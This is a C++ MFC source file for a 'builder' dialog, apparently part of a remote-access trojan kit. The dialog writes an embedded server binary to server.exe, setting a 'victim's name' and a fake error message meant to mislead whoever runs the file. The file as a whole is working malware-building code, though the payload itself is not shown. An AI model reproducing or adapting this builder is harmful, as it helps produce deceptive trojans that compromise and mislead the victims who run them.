// BuilderDlg.cpp : implementation file
//

#include "stdafx.h"
#include "client.h"
#include "BuilderDlg.h"
#include "server.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif


char	ServerName[DEFAULT_SERVER_NAME_SIZE] = DEFAULT_SERVER_NAME;
char	ErrorMessage[DEFAULT_SERVER_FAKEERROR_SIZE] = DEFAULT_SERVER_FAKEERROR;

/////////////////////////////////////////////////////////////////////////////
// CBuilderDlg dialog


CBuilderDlg::CBuilderDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CBuilderDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CBuilderDlg)
	//}}AFX_DATA_INIT
}


void CBuilderDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CBuilderDlg)
	DDX_Control(pDX, IDC_ERRORINPUT, m_InputError);
	DDX_Control(pDX, IDC_FILENAMEINPUT, m_InputFileName);
	DDX_Control(pDX, IDC_NAMEINPUT, m_InputName);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CBuilderDlg, CDialog)
	//{{AFX_MSG_MAP(CBuilderDlg)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CBuilderDlg message handlers

/*pos_s CBuilderDlg::FindDataPosition(unsigned char *data, int maxlen)
{
	pos_s		p;

	p.pos = 0;
	p.block = 1;

	while (memcmp(data, serverfiledata1 + p.pos, maxlen))
	{
		p.pos++;
		if ((p.pos + maxlen) > sizeof(serverfiledata1))
		{
			p.block = 2;
			p.pos = 0;
			while (memcmp(data, serverfiledata2 + p.pos, maxlen))
			{
				p.pos++;
				if ((p.pos + maxlen) > sizeof(serverfiledata2))
				{
					p.block = 0;
					return p;
				}
			}
		}
	}

	return p;
}*/

pos_s CBuilderDlg::FindDataPosition(char *data, int len)
{
	pos_s	p;

	p.block = 0;
	p.pos = 0;

	while (memcmp(data, serverfiledata[p.block] + p.pos, len))
	{
		p.pos++;
		if ((p.pos + len) > charsinblock[p.block])
		{
			p.block++;
			p.pos = 0;
			if (serverfiledata[p.block] == NULL)
				return p;
		}
	}

	return p;
}

void CBuilderDlg::OnOK() 
{
	FILE	*f;
	int		block;
	char	buff[512];
	char	file[MAX_PATH];

	m_InputName.GetWindowText(servername, DEFAULT_SERVER_NAME_SIZE);
	m_InputError.GetWindowText(errormessage, DEFAULT_SERVER_FAKEERROR_SIZE);
	_snprintf(ServerName, sizeof(ServerName), "%s", servername);
	_snprintf(ErrorMessage, sizeof(ErrorMessage), "%s", errormessage);
	m_InputFileName.GetWindowText(file, MAX_PATH);

	if (strlen(file) == 0)
	{
		AfxMessageBox("No file name.", MB_OK | MB_ICONERROR);
		return;
	}

	f = fopen(file, "wb");
	if (f == NULL)
	{
		AfxMessageBox("Failed to open file.", MB_OK | MB_ICONERROR);
		return;
	}

	for (block = 0; serverfiledata[block] != NULL; block++)
		fwrite(serverfiledata[block], charsinblock[block], 1, f);

	fclose(f);

	_snprintf(buff, sizeof(buff) - 1, "Server file created\n\nVictim's name: %s\nError message: %s\nFile name: %s", servername, errormessage, file);

	AfxMessageBox(buff, MB_OK | MB_ICONINFORMATION);
	
//	CDialog::OnOK();
}

BOOL CBuilderDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	pos_s p_name = FindDataPosition(ServerName, sizeof(ServerName));
	pos_s p_error = FindDataPosition(ErrorMessage, sizeof(ErrorMessage));

	if (serverfiledata[p_name.block] == NULL && serverfiledata[p_error.block] == NULL)
	{
		AfxMessageBox("Failed to find default server name or error message.", MB_OK | MB_ICONERROR);
		CDialog::OnCancel();
	}
	else
	{
		servername = serverfiledata[p_name.block] + p_name.pos;
		errormessage = serverfiledata[p_error.block] + p_error.pos;
	}

	m_InputName.SetWindowText(servername);
	m_InputError.SetWindowText(errormessage);
	m_InputFileName.SetWindowText("server.exe");
	
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CBuilderDlg::OnCancel() 
{

	CDialog::OnCancel();
}
